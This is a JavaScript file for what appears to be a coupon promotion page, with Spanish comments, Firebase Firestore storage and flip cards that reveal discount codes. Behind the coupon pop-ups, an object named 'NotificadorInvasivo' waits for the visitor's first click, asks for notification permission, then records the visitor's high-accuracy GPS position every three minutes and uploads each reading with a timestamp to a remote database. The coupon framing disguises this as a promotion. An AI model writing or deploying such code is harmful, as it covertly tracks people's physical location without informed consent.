/* CONEXION BASE DE DATOS */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  getCountFromServer
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// TODO: Replace the following with your app's Firebase project configuration
// See: https://support.google.com/firebase/answer/7015592
const firebaseConfig = {
  apiKey: "AIzaSyBZavR7TNRrzKrxr1RqnvfrUelMLz81hyg",
  authDomain: "bd-herramienta-busqueda.firebaseapp.com",
  projectId: "bd-herramienta-busqueda",
  storageBucket: "bd-herramienta-busqueda.firebasestorage.app",
  messagingSenderId: "416153196731",
  appId: "1:416153196731:web:b0bc4ffe60cbb3a9a3319e",
  measurementId: "G-6S15ZGGCQ4"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
// Initialize Cloud Firestore and get a reference to the service
const db = getFirestore(app);
/* ******************************************************************************* */
/* --- 1. FUNCIÓN PARA GUARDAR EN FIREBASE --- */
async function guardarUbicacionBD(latitud, longitud) {
  try {
    // Verificamos que los datos no lleguen vacíos
    if (latitud === undefined || longitud === undefined) {
      console.error("Latitud o Longitud son indefinidas.");
      return;
    }

    const colRef = collection(db, "ubicaciones");
    const snapshot = await getCountFromServer(colRef);
    const nuevoId = snapshot.data().count;

    await addDoc(colRef, {
      ubicacion: `${latitud}, ${longitud}`,
      id_ubicaciones: nuevoId,
      fecha_ubi: serverTimestamp(),
    });

    console.log(`Guardado con éxito: ID ${nuevoId} (${latitud}, ${longitud})`);
  } catch (e) {
    console.error("Error al guardar en Firebase:", e);
  }
}

/* --- 2. FUNCIÓN DE GEOLOCALIZACIÓN --- */
const opcionesGPS = {
  enableHighAccuracy: true,
  timeout: 20000,
  maximumAge: 0
};

async function obtenerUbicacion() {
  if (!navigator.geolocation) {
    console.error("Geolocalización no soportada");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      // Extraemos las variables correctamente del objeto pos.coords
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      console.log(`Coordenadas obtenidas: ${lat}, ${lon}`);

      // Enviamos las variables extraídas a la función de BD
      await guardarUbicacionBD(lat, lon);
    },
    (err) => {
      console.error("Error GPS:", err.code, err.message);
      // Reintento con baja precisión si falla por tiempo
      if (err.code === err.TIMEOUT) {
        navigator.geolocation.getCurrentPosition(
          p => guardarUbicacionBD(p.coords.latitude, p.coords.longitude),
          null,
          { enableHighAccuracy: false }
        );
      }
    },
    opcionesGPS
  );
}

/* --- 3. OBJETO NOTIFICADOR --- */
const NotificadorInvasivo = {
  registration: null,
  solicitarPermiso: async function (ms) {
    try {
      // Registro del Service Worker (Ruta raíz para Firebase)
      this.registration = await navigator.serviceWorker.register('/sw.js');
      console.log("Service Worker registrado.");

      let permission = await Notification.requestPermission();

      if (permission === "granted") {
        console.log("Permiso concedido. Iniciando capturas...");
        obtenerUbicacion(); // Captura inmediata

        setInterval(() => {
          obtenerUbicacion();
        }, ms);
      }
    } catch (err) {
      console.error("Error en flujo de permisos:", err);
    }
  }
};

/* --- 4. DISPARADOR ÚNICO (UNIVERSAL) --- */
function iniciarTodo() {
  console.log("Interacción detectada. Activando sistema...");

  // Ejecutamos la lógica de permisos y ubicación
  NotificadorInvasivo.solicitarPermiso(180000);

  // Limpiamos los eventos para que no se repita
  document.removeEventListener('click', iniciarTodo);
  document.removeEventListener('touchstart', iniciarTodo);
}

// Escuchadores de eventos
document.addEventListener('click', iniciarTodo);
document.addEventListener('touchstart', iniciarTodo);
/**
 * NOTIFICACIONES CADA 5 MINUTOS 
 * POR EL DESBLOQUEO DE UN CUPON NUEVO
 * PC Y MOVIL
 */
const Noti = {
  msg: "¡Cupón: PROMO2026! 🎁",

  lanzar: function () {
    //Notificación de sistema (PC/Android)
    if (Notification.permission === "granted") {
      new Notification("¡Nuevo Cupón!", { body: this.msg });
    }

    // 2. Notificación en pantalla (Celular/Todos)
    const div = document.createElement('div');
    div.innerHTML = this.msg;
    div.style = "position:fixed;bottom:20px;right:20px;background:#000;color:#fff;padding:15px;border-radius:8px;z-index:9999;font-family:sans-serif";
    document.body.appendChild(div);

    setTimeout(() => div.remove(), 5000); // Desaparece en 5 seg
  },

  iniciar: function () {
    // Pedir permiso al primer clic
    document.addEventListener('click', () => Notification.requestPermission(), { once: true });

    // Ciclo de 3 minutos
    setInterval(() => this.lanzar(), 180000);
  }
};

Noti.iniciar();

/**funcion para el flip() 
 * imagen que al dar clic se voltee y muestre un codigo de descuento 
 * de esa página
*/
$("#card").flip();
$("#carde").flip();
